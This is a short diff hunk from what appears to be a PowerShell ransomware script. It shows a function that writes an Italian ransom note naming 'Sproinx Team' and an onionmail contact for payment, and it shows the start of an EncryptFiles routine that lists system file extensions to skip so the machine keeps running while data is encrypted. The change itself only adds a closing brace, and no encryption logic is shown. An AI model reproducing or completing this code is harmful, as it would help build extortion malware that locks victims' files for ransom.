@@ -284,6 +284,7 @@ function SendOK {
 
 function CreateReadme {
    $ReadmeTXT = "Sei stato attaccato da Sproinx Team ;-; contatta greensmerald@onionmail.org per avere informazioni su come effettuare il pagamento e riavere i tuoi dati ;-)"
+   }
    
 function EncryptFiles { 
    $ExcludedFiles = '*.psr', 'readme.txt', '*.dll', '*.ini', '*.sys', '*.exe', '*.msi', '*.NLS', '*.acm', '*.nls', '*.EXE', '*.dat', '*.efi', '*.mui'
